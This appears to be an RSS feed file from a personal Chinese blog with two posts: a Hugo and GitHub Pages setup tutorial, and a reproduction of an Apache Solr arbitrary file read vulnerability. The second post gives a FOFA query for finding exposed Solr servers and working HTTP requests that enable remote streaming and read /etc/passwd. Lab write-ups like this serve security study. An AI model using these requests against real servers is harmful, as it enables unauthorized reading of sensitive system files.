@@ -1,0 +1,166 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Posts on wkend&#39;s blog</title>
+		<link>https://wkend.github.io/posts/</link>
+		<description>Recent content in Posts on wkend&#39;s blog</description>
+		<generator>Hugo -- gohugo.io</generator>
+		<language>en-us</language>
+		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+		<lastBuildDate>Thu, 06 May 2021 15:33:07 +0800</lastBuildDate>
+		<atom:link href="https://wkend.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Github&#43;hugo搭建个人博客</title>
+			<link>https://wkend.github.io/posts/github&#43;hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</link>
+			<pubDate>Thu, 06 May 2021 15:33:07 +0800</pubDate>
+			
+			<guid>https://wkend.github.io/posts/github&#43;hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</guid>
+			<description>0x01 github新建仓库 Repository name：xxx.github.io 进入仓库设置： 进入Pages页面， 建立GitHub Pages 验证，访问地址https:/</description>
+			<content type="html"><![CDATA[<h2 id="0x01-github新建仓库">0x01 github新建仓库</h2>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506111420970.png" alt="image-20210506111420970"></p>
+<p>Repository name：<code>xxx.github.io</code></p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506142008117.png" alt="image-20210506142008117"></p>
+<p>进入仓库设置：</p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506111829164.png" alt="image-20210506111829164"></p>
+<p>进入<code>Pages</code>页面，</p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506111949907.png" alt="image-20210506111949907"></p>
+<p>建立GitHub Pages</p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506112134367.png" alt="image-20210506112134367"></p>
+<p>验证，访问地址<code>https://wkend.github.io/wkend.giothub.io/</code></p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506112313446.png" alt="image-20210506112313446"></p>
+<h2 id="0x02-安装配置hugo">0x02 安装配置hugo</h2>
+<p>下载地址：https://github.com/gohugoio/hugo/releases</p>
+<p>配置环境变量</p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506112755582.png" alt="image-20210506112755582"></p>
+<p>验证：</p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506112849635.png" alt="image-20210506112849635"></p>
+<h2 id="0x03-初始化">0x03 初始化</h2>
+<h3 id="31-本地文件目录生成">3.1 本地文件目录生成</h3>
+<p>在本地选择一个路径来存放博客，在选好的路径下执行：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">hugo new site MyBlog
+</code></pre></div><p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506113306794.png" alt="image-20210506113306794"></p>
+<p>查看生成的本地目录结构</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">├─archetypes	 <span class="c1"># 内容类型，在创建新内容时自动生成内容的配置</span>
+├─content	 <span class="c1"># 网站内容，Markdown 文件</span>
+├─data	<span class="c1"># 存放自定义或者导入的模板</span>
+├─layouts	<span class="c1"># 网站模版，选择主题后会将主题中的 layouts 文件夹中的内容复制到此文件夹中</span>
+├─static	<span class="c1"># 包含 CSS、JavaScript、Fonts、media 等，决定网站的外观。选择主题后会将主题中的 ststic 文件夹中的内容复制到此文件夹中</span>
+└─themes	<span class="c1"># 存放主题文件</span>
+</code></pre></div><h3 id="32-配置主题hermit">3.2 配置主题hermit</h3>
+<p>官方主题模板地址：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fthemes.gohugo.io%2F">https://themes.gohugo.io/</a></p>
+<p>将主题文件放到<code>/MyBlog/themes</code>目录下，</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/Track3/hermit.git themes/hermit
+</code></pre></div><p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506133753324.png" alt="image-20210506133753324"></p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506114319593.png" alt="image-20210506114319593"></p>
+<p>利用主题文件夹中的配置文件<code>MyBlog\themes\hermit\exampleSite\config.toml</code>覆盖博客配置文件<code>MyBlog\config.toml</code></p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506114632492.png" alt="image-20210506114632492"></p>
+<h3 id="33-测试验证">3.3 测试验证</h3>
+<p>新建一篇博文<code>test.md</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">hugo new posts/test.md
+</code></pre></div><p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506114919541.png" alt="image-20210506114919541"></p>
+<p>编辑新生成的博文<code>\MyBlog\content\posts\test.md</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-markdown" data-lang="markdown">---
+title: &#34;Test&#34;
+date: 2021-05-06T11:48:26+08:00
+draft: false	<span class="ni">#此处要改为false</span>，否则在首页不会显示！
+toc: false
+images:
+tags: 
+  <span class="k">-</span> test
+
+---
+
+<span class="gh"># test
+</span><span class="gh"></span>
+This is a test page，，，
+
+
+</code></pre></div><p>开启本地服务，查看预览</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">hugo server -D
+</code></pre></div><h3 id="34-建立站点">3.4 建立站点</h3>
+<p>在博客根目录下执行：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">hugo
+</code></pre></div><p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/image-20210506140446634.png" alt="image-20210506140446634"></p>
+<p>此时你的博客目录下会多出一个 <code>public </code>文件夹来，这便是 Hugo 生成的网站。</p>
+<h2 id="0x04-发布">0x04 发布</h2>
+<p><code>Hugo</code> 并没有提供自动发布到 <code>GitHub Pages</code> 的功能。需要将 <code>public</code> 中的内容手动上传到 <code>Github</code> 上。 首先执行命令 <code>cd public</code> 进入到 <code>public</code> 文件夹中 然后执行</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> public/
+$ git init
+$ git remote add origin https://github.com/wkend/wkend.github.io.git
+$ git branch -M main
+$ git add -A
+$ git commit -m <span class="s2">&#34;first&#34;</span>
+$ git push -u origin main
+</code></pre></div>]]></content>
+		</item>
+		
+		<item>
+			<title>ApacheSolr任意文件读取漏洞复现</title>
+			<link>https://wkend.github.io/posts/apachesolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+			<pubDate>Thu, 06 May 2021 13:43:10 +0800</pubDate>
+			
+			<guid>https://wkend.github.io/posts/apachesolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+			<description>0x01 漏洞说明 Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。Solr是一个独立的企业级搜索应用服务器，很多企业运用</description>
+			<content type="html"><![CDATA[<h2 id="0x01-漏洞说明">0x01 漏洞说明</h2>
+<p>Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。Solr是一个独立的企业级搜索应用服务器，很多企业运用solr开源服务。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。它的主要特性包括：高效、灵活的缓存功能，垂直搜索功能，高亮显示搜索结果，通过索引复制来提高可用性，提 供一套强大Data Schema来定义字段，类型和设置文本分析，提供基于Web的管理界面等。</p>
+<p>Apache Solr 全版本存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标系统的敏感文件。</p>
+<h2 id="0x02-影响版本">0x02 影响版本</h2>
+<ul>
+<li>全版本(&lt;=8.8.1)</li>
+</ul>
+<h3 id="0x03-漏洞复现">0x03 漏洞复现</h3>
+<h4 id="31-fofa搜索">3.1 fofa搜索：</h4>
+<pre><code>app=&quot;Solr&quot; || app=&quot;Apache-Solr&quot;
+</code></pre><h4 id="32-环境配置">3.2 环境配置</h4>
+<p>下载Solr进行解压缩：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">https://solr.apache.org/downloads.html     <span class="c1">#solr下载</span>
+</code></pre></div><p>进入Solr的bin目录执行命令：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">./solr start -force
+</code></pre></div><p>访问url:<code>http://192.168.239.131:8983/solr/</code>出现如下页面即为启动成功。</p>
+<p><!-- raw HTML omitted --></p>
+<p>此时启动的solr是没有核心进行索引和搜索的,</p>
+<p><img src="https://gitee.com/wkendXu/typora-picture/raw/master/6d8DsxLPphWmJnv.png" alt="image-20210429171144166"></p>
+<p>创建一个数据驱动模式的核心:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">./solr create -c &lt;name&gt;   <span class="c1"># 创建一个数据驱动模式的核心</span>
+</code></pre></div><p><!-- raw HTML omitted --></p>
+<p>访问url：<code>http://192.168.239.131:8983/solr/admin/cores?indexInfo=false&amp;wt=json</code></p>
+<p><!-- raw HTML omitted --></p>
+<p>burp数据包：</p>
+<p><img src="https://i.loli.net/2021/04/30/l1bjiE5TUX93DxC.png" alt="image-20210430133958776"></p>
+<p>漏洞验证：</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/solr/test/config</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">192.168.239.131:8983</span>
+<span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">82</span>
+
+<span class="g">{&#34;set-property&#34; : {&#34;requestDispatcher.requestParsers.enableRemoteStreaming&#34;:true}}
+</span></code></pre></div><p><img src="https://i.loli.net/2021/04/30/dtUO4ngqzC9ARXr.png" alt="image-20210430135216292"></p>
+<p>当出现&quot;This response format is experimental. It is likely to change in the future.&quot; 表示可能存在漏洞。</p>
+<h4 id="33-漏洞利用">3.3 漏洞利用</h4>
+<p>进行文件读取，</p>
+<p>post包：</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/solr/test/debug/dump?param=ContentStreams</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">192.168.239.131:8983</span>
+<span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">29</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+
+stream.url=file:///etc/passwd
+</code></pre></div><p><img src="https://i.loli.net/2021/04/30/uidBk2SLcTmnCeF.png" alt="image-20210430135615289"></p>
+]]></content>
+		</item>
+		
+	</channel>
+</rss>
